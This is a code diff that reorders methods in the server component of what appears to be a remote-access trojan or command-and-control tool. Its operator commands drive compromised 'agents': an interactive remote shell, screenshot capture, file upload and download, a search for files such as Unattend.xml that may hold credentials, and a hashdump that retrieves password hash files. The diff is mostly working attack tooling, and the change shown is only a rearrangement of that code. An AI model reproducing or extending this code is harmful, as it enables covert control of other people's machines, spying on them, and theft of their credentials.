@@ -376,35 +376,27 @@ class Server:
     ########################################### SERVER COMMANDS ########################################################
     ####################################################################################################################
 
-    def shell(self, args=None):
-        """ Enter in shell mode. The commands are sent to the agent and the output is displayed """
-        self.current_agent.sock.sendall("shell".encode())
-        session = PromptSession()
-        while True:
-            command = session.prompt('$> ').strip()
-            if command == '':
-                continue
-            if command.lower() == 'exit':
-                self.current_agent.sock.sendall("exit".encode())
-                break
-            self.current_agent.sock.sendall(command.encode())
-            print(self.current_agent.sock.recv(8192).decode('latin1'))
+    def background(self, args=None):
+        """ Unselect the current agent """
+        self.current_agent = Agent(['', ''], '', 0)
 
-    def screenshot(self, args):
-        self.current_agent.sock.sendall("screenshot".encode())
-        args = list(filter(lambda x: x != "", args.split(" ")))
-        if len(args) >= 1:
-            screen_path = f"{args[0]}.jpg"
-        else:
-            screen_path = f"{secrets.token_hex(5)}.jpg"
-        with open(screen_path, 'wb') as f:
-            while True:
-                data = self.current_agent.sock.recv(1024)
-                if (data == SIG_EOF) or (not data):
-                    break
-                f.write(data)
-        print(f'Screenshot saved at {screen_path}')
-    
+    def exec(self, args):
+        os.system(args)
+
+    def exit(self, args=None):
+        print("\nClosing server...")
+        # unblock the listener
+        self.simple_ssl_connection()
+        self.server_socket.close()
+        self.stop_event.set()
+        self.close_all_connections()
+        self.is_exited = True
+        exit(0)
+
+    ####################################################################################################################
+    ########################################### CLIENT COMMANDS ########################################################
+    ####################################################################################################################
+
     def download(self, args):
         self.current_agent.sock.sendall(f"download {args}".encode())
         args = list(filter(lambda x: x != "", args.split(" ")))
@@ -422,9 +414,33 @@ class Server:
         self.current_agent.sock.sendall(f"upload {args[1]}".encode())
         self.send_file(args[0])
 
-    def background(self, args=None):
-        """ Unselect the current agent """
-        self.current_agent = Agent(['',''],'',0)
+    def shell(self, args=None):
+        """ Enter in shell mode. The commands are sent to the agent and the output is displayed """
+        self.current_agent.sock.sendall("shell".encode())
+        session = PromptSession()
+        while True:
+            command = session.prompt('$> ').strip()
+            if command == '':
+                continue
+            if command.lower() == 'exit':
+                self.current_agent.sock.sendall("exit".encode())
+                break
+            self.current_agent.sock.sendall(command.encode())
+            print(self.current_agent.sock.recv(8192).decode('latin1'))
+
+    def search(self,args):
+        args = list(filter(lambda x: x != "", args.split(" ")))
+        if len(args) < 2:
+            print("Please specify a starting path and a file name\n\tEx: search C:\\ Unattend.xml")
+            return
+        self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
+        while True:
+            data = self.current_agent.sock.recv(1024)
+            decoded_data = data.decode("latin1")
+            if (data == SIG_EOF) or (not data):
+                break
+            print('---')
+            print(decoded_data)
 
     def hashdump(self, args=None):
         files = []
@@ -447,35 +463,23 @@ class Server:
         self.current_agent.sock.sendall("hashdump".encode())
         for i in range(len(files)):
             self.get_file(files[i])
-    
+
     def ipconfig(self, args=None):
         self.current_agent.sock.sendall("ipconfig".encode())
         data = self.current_agent.sock.recv(16384)
         print("\n" + data.decode('utf-8'))
-    
-    def search(self,args):
+
+    def screenshot(self, args):
+        self.current_agent.sock.sendall("screenshot".encode())
         args = list(filter(lambda x: x != "", args.split(" ")))
-        if len(args) < 2:
-            print("Please specify a starting path and a file name\n\tEx: search C:\\ Unattend.xml")
-            return
-        self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
-        while True:
-            data = self.current_agent.sock.recv(1024)
-            decoded_data = data.decode("latin1")
-            if (data == SIG_EOF) or (not data):
-                break
-            print('---')
-            print(decoded_data)
-
-    def exec(self, args):
-        os.system(args)
-
-    def exit(self, args=None):
-        print("\nClosing server...")
-        # unblock the listener
-        self.simple_ssl_connection()
-        self.server_socket.close()
-        self.stop_event.set()
-        self.close_all_connections()
-        self.is_exited = True
-        exit(0)
+        if len(args) >= 1:
+            screen_path = f"{args[0]}.jpg"
+        else:
+            screen_path = f"{secrets.token_hex(5)}.jpg"
+        with open(screen_path, 'wb') as f:
+            while True:
+                data = self.current_agent.sock.recv(1024)
+                if (data == SIG_EOF) or (not data):
+                    break
+                f.write(data)
+        print(f'Screenshot saved at {screen_path}')
